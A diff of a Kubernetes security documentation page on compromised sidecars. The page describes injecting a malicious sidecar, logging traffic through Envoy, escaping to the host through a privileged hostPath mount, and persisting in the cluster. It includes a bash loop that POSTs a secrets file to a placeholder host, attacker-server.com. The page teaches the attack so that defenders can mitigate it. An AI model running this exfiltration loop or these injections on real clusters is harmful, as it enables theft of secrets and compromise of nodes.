@@ -1,22 +1,20 @@
 ---
-sidebar_position: 16
+sidebar_position: 14
 title: "Compromised Sidecars"
 description: "How attackers exploit insecure or malicious sidecar containers to intercept data, escalate privileges, and persist within Kubernetes clusters."
 ---
 
 # Compromised Sidecars
 
-**Sidecar containers** in Kubernetes extend the functionality of primary application containers by handling logging, monitoring, security, or proxy services. If **misconfigured, compromised, or maliciously injected**, attackers can use sidecars to **steal sensitive data, intercept requests, escalate privileges, and persist within the cluster**.
+Sidecar containers in Kubernetes extend the functionality of application containers by handling logging, monitoring, proxies, or other supporting services. However, if sidecars are **misconfigured, maliciously injected, or overly privileged**, they can be exploited to intercept sensitive data, gain elevated access, or maintain long-term persistence in the cluster.
 
 ---
 
-## Exploitation Steps: Abusing Sidecars for Malicious Activity
+## Exploitation Steps
 
-An attacker exploits **insecure or compromised sidecar containers** to manipulate traffic, extract sensitive data, or maintain persistence.
+### 1. Deploy a Malicious Sidecar
 
-### Step 1: Deploy a Malicious Sidecar
-
-If an attacker gains control over a workload’s **PodSpec**, they inject a **malicious sidecar** to intercept application data.
+If an attacker gains control over a Pod specification (e.g., through CI/CD poisoning or RBAC misconfig), they can inject a malicious sidecar:
 
 ```yaml
 apiVersion: v1
@@ -37,13 +35,13 @@ spec:
       emptyDir: {}
 ```
 
-Once deployed, the malicious sidecar can **exfiltrate logs, credentials, and API responses**.
+This sidecar has access to the app’s volume and can exfiltrate credentials, logs, or sensitive files.
 
-### Step 2: Intercept and Modify Traffic
+---
 
-Sidecars are commonly used for **service mesh proxies** and **logging agents**. An attacker abuses a misconfigured sidecar to intercept **sensitive API requests**.
+### 2. Intercept and Modify Traffic
 
-Example: Capturing all incoming requests in an **Envoy sidecar**:
+Service mesh sidecars like Envoy can be abused to log or alter traffic. For example, a misconfigured Envoy sidecar might write incoming requests to a local file:
 
 ```yaml
 admin:
@@ -63,13 +61,13 @@ static_resources:
                       path: "/data/logs/requests.log"
 ```
 
-Captured API responses contain **JWT tokens, credentials, and user data**.
+These logs could include JWT tokens, user credentials, and sensitive application data.
 
-### Step 3: Abuse Privileged Sidecars for Host Access
+---
 
-If a sidecar runs **with elevated privileges**, an attacker can escalate access to the host.
+### 3. Abuse Privileged Sidecars for Host Access
 
-Example: A misconfigured sidecar with **hostPath volume access**:
+When a sidecar container is deployed with `privileged: true` and mounted to the host, the attacker can interact with the node:
 
 ```yaml
 apiVersion: v1
@@ -94,39 +92,46 @@ spec:
         type: Directory
 ```
 
-Once inside the pod, the attacker **gains control over the Kubernetes node**.
+Then:
 
 ```bash
 kubectl exec -it privileged-sidecar -- /bin/sh
 ls /host/etc/
 ```
 
-### Step 4: Persist Within the Cluster
+The sidecar can access host files, potentially leading to full node compromise.
 
-Attackers use **malicious sidecars** to maintain long-term access, even if the primary container is removed.
+---
 
-- **Hidden Reverse Shell:** The sidecar listens for remote commands.
-- **Stealthy Traffic Proxy:** The sidecar routes traffic to an attacker-controlled server.
-- **Scheduled Data Exfiltration:** The sidecar periodically sends logs and credentials.
+### 4. Persist Within the Cluster
 
-Example: Backdoor inside a sidecar container:
+Even if the main container is removed, a malicious sidecar may remain active. It can:
+
+- Serve as a **reverse shell**
+- Forward traffic to a C2 server
+- Periodically **exfiltrate secrets**
+
+Example:
 
 ```bash
 while true; do cat /data/secrets.txt | curl -X POST -d @- http://attacker-server.com/upload; sleep 60; done
 ```
 
-Even if the **main container is deleted**, the sidecar remains **running and active**.
-
-### Result
-
-The attacker successfully **intercepted sensitive data, modified traffic, escalated privileges, and persisted within the cluster** using a compromised or malicious sidecar.
+Such persistence allows long-term access even after incident response cleans up the primary application.
 
 ---
 
-## Mitigation Steps
+### Result
 
-To protect against **compromised sidecars**, follow the security best practices outlined in:
+A compromised or malicious sidecar enables the attacker to:
 
-➡ **[Securing Kubernetes Sidecars](/docs/best_practices/cluster_setup_and_hardening/pod_security/compromised_sidecars_mitigation)**
+- Intercept and modify sensitive traffic
+- Steal secrets and credentials
+- Escalate to the host
+- Maintain stealthy persistence in the cluster
 
-This guide covers techniques such as **restricting sidecar permissions, enforcing strict security contexts, implementing service mesh policies, and monitoring sidecar activity** to prevent unauthorized use.
+---
+
+## Mitigation
+
+➡ [Securing Kubernetes Sidecars](/docs/best_practices/cluster_setup_and_hardening/pod_security/compromised_sidecars_mitigation)
